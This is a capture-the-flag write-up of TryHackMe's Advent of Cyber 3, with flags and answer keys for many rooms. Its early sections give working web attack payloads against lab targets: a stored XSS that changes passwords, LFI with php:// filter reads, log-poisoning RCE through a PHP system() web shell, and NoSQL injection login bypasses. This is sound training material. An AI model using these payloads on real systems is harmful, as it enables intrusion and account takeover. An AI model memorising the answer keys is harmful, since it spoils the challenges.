# Advent of Cyber 3 - Easy

1. [Save The Gifts](#save-the-gifts)
2. [Elf HR Problems](#elf-hr-problems)
3. [Christmas Blackout](#christmas-blackout)
4. [Santa's Running Behind](#santas-running-behind)
5. [Pesky Elf Forum](#pesky-elf-forum)
6. [Patch Management Is Hard](#patch-management-is-hard)
7. [Migration Without Security](#migration-without-security)
8. [Santa's Bag of Toys](#santas-bag-of-toys)
9. [Where Is All This Data Going](#where-is-all-this-data-going)
10. [Offensive Is The Best Defence](#offensive-is-the-best-defence)
11. [Where Are The Reindeers?](#where-are-the-reindeers)
12. [Sharing Without Caring](#sharing-without-caring)
13. [They Lost The Plan!](#they-lost-the-plan)
14. [Dev(Insecure)Ops](#devinsecureops)
15. [Ransomware Madness](#ransomware-madness)
16. [Elf Leaks](#elf-leaks)
17. [Playing With Containers](#playing-with-containers)
18. [Something Phishy Is Going On](#something-phishy-is-going-on)
19. [What's the Worst That Could Happen?](#whats-the-worst-that-could-happen)
20. [Needles In Computer Stacks](#needles-in-computer-stacks)
21. [How It Happened](#how-it-happened)
22. [PowershELlF Magic](#powershellf-magic)
23. [Learning From The Grinch](#learning-from-the-grinch)

## Save The Gifts

```markdown
This challenge is about IDOR (Insecure Direct Object Reference) vulnerabilities.

IDOR vulnerabilities rely on changing user-supplied data, from query components, post variables or cookies.

Now, in the given website, we have four pages, out of which 'Your Activity' contains user input that can be modified.

We change the user_id value and try to find the odd user out.

When user_id=9, we get the Grinch's account.

After reverting the actions, we get the flag.
```

```markdown
1. After finding Santa's account, what is their position in the company? - The Boss!

2. After finding McStocker's account, what is their position in the company? - Build Manager

3. After finding the account responsible for tampering, what is their position in the company? - Mischief Manager

4. What is the received flag when McSkidy fixes the Inventory Management System? - THM{AOC_IDOR_2B34BHI3}
```

## Elf HR Problems

```markdown
In this challenge, we learn about cookies and how to manipulate them.

In the given website, we create an account and attempt to register.

We are not able to bypass the login portal, however a cookie is created.

The value of the cookie is encoded in 'From Hex', decoded using CyberChef tool.

Now, in order to manipulate the cookie, we modify the decoded cookie such that the JSON data now includes 'admin'.

Then, we encode it to hexadecimal again, so that we can use it in Developer Tools.

This allows us to bypass login.
```

```markdown
1. What is the name of the new cookie that was created for your account? - user-auth

2. What encoding type was used for the cookie value? - hexadecimal

3. What object format is the data of the cookie stored in? - JSON

4. What is the value of the administrator cookie? - 7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d

5. What team environment is not responding? - HR

6. What team environment has a network warning? - Application
```

## Christmas Blackout

```markdown
This challenge highlights the topic of content discovery.

We can use ffuf to scan the website

Command: ffuf -u http://10.10.30.30/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s

We get some folders; one of them contains a login panel.

We can use default creds administrator:administrator to login, which gives us the flag.
```

```markdown
1. What is the name of the folder? - admin

2. What is the password? - administrator

3. What is the value of the flag? - THM{ADM1N_AC3SS}
```

## Santa's Running Behind

```markdown
This challenge is about fuzzing login forms.

Referring the given walkthrough, we can make use of Burp Suite to fuzz the login form.

While fuzzing in Intruder, we have to fuzz only the password field, as we know the username is "santa".

After fuzzing, we get the password which can be used for login to get flag.
```

```markdown
1. What valid password can you use to access the "santa" account? - cookie

2. What is the flag in Santa's itinerary? - THM{SANTA_DELIVERS}
```

## Pesky Elf Forum

```markdown
This challenge is about XSS vulnerabilities.

They can be of four types - DOM, Reflected, Stored and Blind.

Now, we login to the given forum link using the creds McSkidy:password.

We change our password to 'pass123', which modifies the URL.

Now, we have to add a comment, exploiting the XSS vulnerability.

Payload: <script>fetch('/settings?new_password=pass123');</script>

We have to logout and login using the Grinch's creds Grinch:pass123

On disabling the plugin, we get the flag.
```

```markdown
1. What flag did you get when you disabled the plugin? - THM{NO_MORE_BUTTMAS}
```

## Patch Management Is Hard

```markdown
This challenge is about LFI vulnerabilities.

We visit the website at <http://10.10.59.80.p.thmlabs.com>

To find an entrypoint, we can use this link and also check the site at <http://10.10.59.80>

We can see in the URL that we have the 'err' parameter; this would be our entrypoint for LFI.

Current URL: <http://10.10.59.80/index.php?err=error.txt>

Modified URL: <http://10.10.59.80/index.php?err=/etc/passwd>

As we have to read /etc/flag, we have to include that in URL.

Modifed URL: <http://10.10.59.80/index/php?err=/etc/flag>

Now, we need to use the PHP filter technique to read the index.php file

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/index.php>

The output can be copied and decoded from base64 to get the flag value.

To read the credentials file, we can replace the path of index.php by the credentials file path.

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=/var/www/html/includes/creds.php>

We can use these creds to login and get the flag in the 'Password Recovery' section.

Now, we have to use LFI to gain RCE via log file page.

Log file page: <http://10.10.59.80/logs.php>

Log file location: ./includes/logs/app_access.log

To get RCE, we need to include PHP code into User-Agent part in the log file.

Command: curl -A "<?php phpinfo();?>" http://10-10-59-80.p.thmlabs.com/index.php

We have to visit log file using LFI.

Required URL: <http://10.10.59.80/index.php?err=php://filter/convert.base64-encode/resource=./includes/logs/app_access.log>

We will have to use this through a private window to avoid the current login session.

This gives us the log file info, so we can now continue with actually doing the RCE bit; we can use log poisoning.

Command: curl -A "<?php system(\$_GET['cmd']);?>" http://10-10-59-80.p.thmlabs.com/index.php

Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log>

We need to get hostname of web server.

Required URL: <http://10.10.59.80/index.php?err=../../../../var/www/html/includes/logs/app_access.log&cmd=hostname>
```

```markdown
1. What is the entry point for our web application? - err

2. Use the entry point to perform LFI to read the /etc/flag file. What is the flag? - THM{d29e08941cf7fe41df55f1a7da6c4c06}

3. Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value? - THM{791d43d46018a0d89361dbf60d5d9eb8}

4. What are the username and password? - McSkidy:A0C315Aw3s0m

5. What is the password of the flag.thm.aoc server? - THM{552f313b52e3c3dbf5257d8c6db7f6f1}

6. What is the hostname of the webserver? - lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```

## Migration Without Security

```shell
ssh thm@10.10.128.156 -p 2222

mongo
#connect and interact with mongodb

show databases

use flagdb

db.getCollectionNames();

db.flagColl.find()
#gives flag
```

```markdown
We visit the link given and attempt to search for an user.

We can intercept the login request using Burp and modify the POST parameter.

Original: username=joe&password=mama

Modified: username=admin&password[$ne]=mama

After bypassing login, we can retrieve the flag.

Now, for searching the guest roles, we have to modify the parameter again.

Original: GET /search?username=guest&role=user

Modified: GET /search?username[$ne]=guest&role=guest

This gives us the flag.

For the final part, we have to get mcskidy record, for which we have to modify the parameter again.

Modified: GET /search?username=mcskidy&role[$ne]=user
```

```markdown
1. Interact with the MongoDB server to find the flag. What is the flag? - THM{8814a5e6662a9763f7df23ee59d944f9}

2. Log into the application that Grinch Enterprise controls as admin and retrieve the flag? - THM{b6b304f5d5834a4d089b570840b467a8}

3. Use the gift search page to list all usernames that have guest roles. What is the flag? - THM{2ec099f2d602cc4968c5267970be1326}

4. What is the details record? - 
ID:6184f516ef6da50433f100f4:mcskidy:admin
```

## Santa's Bag of Toys

```markdown
First, we remotely connect to the system.

Command: xfreerdp /u:Administrator /p:grinch123! /v:10.10.52.155

We have to view the PowerShell Transcription Logs, in the folder SantasLaptopLogs.

From the 5 log files given to us, we can find the answers.

Now, we have to decode from base64 the UsrClass.dat file contents, which can be copied from the logs, and decoded in CyberChef.

After downloading the decoded file, we have to use it in ShellBagsExplorer now.

File > Load offline hive > decoded.dat

Now we can go through the discovered Shellbags.

The directories give us some clues regarding the contents of the folders.

From these clues, we can search on Github for the required repository.

We can get the password for the UHA file from the previous GitHub commits.

This password can be used to unlock the UHA file.
```

```markdown
1. What operating system is Santa's laptop running? - Microsoft Windows 11 Pro

2. What was the password set for the new "backdoor" account? - grinchstolechristmas

3. What is the full path of the original file? - C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat

4. What is the name of this LOLbin? - certutil.exe

5. What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform? - .github

6. What is the name of the file found in this folder? - bag_of_toys.zip

7. What is the name of the user that owns the SantaRat repository? - Grinchiest

8. What is the name of the repository that seems especially pertinent to our investigation? - operation-bag-of-toys

9. What is the name of the executable that installed a unique utility the actor used to collect the bag of toys? - uharc-cmd-install.exe

10. What are the contents of these "malicious" files? - GRINCHMAS

11. What is the password to the original bag_of_toys.uha archive? - TheGrinchiestGrinchmasOfAll

12. How many original files were present in Santa's Bag of Toys? - 228
```

## Where Is All This Data Going

```markdown
We have to use Wireshark to analyze the given packet files. We can use filters to search.

Required filters:

    http.request.method == GET

    http.request.method == POST

    dns

    ftp

    ftp-data
```

```markdown
1. In the HTTP #1 - GET requests section, which directory is found on the web server? - login

2. What is the username and password used in the login page in the HTTP #2 - POST section? - McSkidy:Christmas2021!

3. What is the User-Agent's name that has been sent in HTTP #2 - POST section? - TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}

4. In the DNS section, there is a TXT DNS query. What is the flag in the message of that DNS query? - THM{dd63a80bf9fdd21aabbf70af7438c257}

5. In the FTP section, what is the FTP login password? - TryH@ckM3!

6. In the FTP section, what is the FTP command used to upload the secret.txt file? - STOR

7. In the FTP section, what is the content of the secret.txt file? - 123^-^321
```

## Offensive Is The Best Defence

```markdown
1. How many ports are open between 1 and 100?

2. What is the smallest port number that is open?

3. What is the service related to the highest port number?

4. Now run nmap -sS MACHINE_IP. Did you get the same results?

5. What is the version number of the web server?

6. What is the CVE number of the vulnerability that was solved in version 2.4.51?

7. What is the port number that appeared in the results now?

8. What is the name of the program listening on the newly discovered port?
```

## Where Are The Reindeers?

```markdown
1. There is an open port related to MS SQL Server accessible over the network. What is the port number?

2. What is the prompt that you have received?

3. What is the first name of the reindeer of id 9?

4. What is the destination of the trip scheduled on December 7?

5. What is the quantity available for the present "Power Bank"?

6. There is a flag hidden in the grinch user's home directory. What are its contents?
```

## Sharing Without Caring

```markdown
1. How many TCP ports are open?

2. Which port is detected by Nmap as NFS or using the mountd service?

3. How many shares did you find?

4. How many shares show "everyone"?

5. What is the title of file 2680-0.txt?

6. What is the name of the share?

7. What is the MD5 sum of id_rsa?
```

## They Lost The Plan

```markdown
1. Complete the username?

2. What is the OS version?

3. What backup service did you find running on the system?

4. What is the path of the executable for the backup service you have identified?

5. What user do you have?

6. What is the content of the flag.txt file?

7. Where can we find him at 5:30?
```

## Dev(Insecure)Ops

```markdown
1. How many pages did the dirb scan find with its default wordlist?

2. How many scripts do you see in the /home/thegrinch/scripts folder?

3. What are the five characters following $6$G in pepper's password hash?

4. What is the content of the flag.txt file on the Grinch's user's desktop?
```

## Ransomware Madness

```markdown
1. What is the operator's username?

2. What social media platform is the username associated with?

3. What is the cryptographic identifier associated with the operator?

4. What platform is the cryptographic identifier associated with?

5. What is the bitcoin address of the operator?

6. What platform does the operator leak the bitcoin address on?

7. What is the operator's personal email?

8. What is the operator's real name?
```

## Elf Leaks

```markdown
1. What is the name of the S3 Bucket used to host the HR Website announcement?

2. What is the message left in the flag.txt object from that bucket?

3. What other file in that bucket looks interesting to you?

4. What is the AWS Access Key ID in that file?

5. What is the AWS Account ID that access-key works for?

6. What is the Username for that access-key?

7. Under the TAGs, what is the Name of the instance?

8. What is the database password stored in Secrets Manager?
```

## Playing With Containers

```markdown
1. What command will list container images stored in your local container registry?

2. What command will allow you to save a docker image as a tar archive?

3. What is the name of the file for the configuration, repository tags, and layer hash values stored in a container image?

4. What is the token value you found for the bonus challenge?
```

## Something Phishy Is Going On

```markdown
1. Who was the email sent to?

2. Who does it say the email was from?

3. If this email was replied to, what email address will receive the email response?

4. What is the misspelled word?

5. What is the link to the credential harvesting website?

6. What is the header and its value?

7. What is the name of the attachment?

8. What is the flag in the PDF file?
```

## What's the Worst That Could Happen?

```markdown
1. What is the output?

2. What is the file type?

3. When was the file first seen in the wild?

4. What is the classification assigned to the file by Microsoft?

5. What were the first two names of this file?

6. What is the maximum number of total characters that can be in the file?
```

## Needles In Computer Stacks

```markdown
1. What boolean operator shall we replace the 'and' with, in order for the rule to still hit the file?

2. What option is used in the Yara command in order to list down the metadata of the rules that are a hit to a file?

3. What section contains information about the author of the Yara rule?

4. What option is used to print only rules that did not hit?

5. What is the result?
```

## How It Happened

```markdown
1. What is the username from the decoded script?

2. What is the mailbox password you found?

3. What is the subject of the email?

4. What port is the script using to exfiltrate data from the North Pole?

5. What is the flag hidden found in the document that Grinch Enterprises left behind?

6. There is still a second flag somewhere... can you find it on the machine?
```

## PowershELlF Magic

```markdown
1. What command was executed as Elf McNealy to add a new user to the machine?

2. What user executed the PowerShell file to send the password.txt file from the administrator's desktop to a remote server?

3. What was the IP address of the remote server? What was the port used for the remote connection?

4. What was the encryption key used to encrypt the contents of the text file sent to the remote server?

5. What application was used to delete the password.txt file?

6. What is the date and timestamp the logs show that password.txt was deleted?

7. What were the contents of the deleted password.txt file?
```

## Learning from The Grinch

```markdown
1. What is the username of the other user on the system?

2. What is the NTLM hash of this user?

3. What is the password for this user?
```
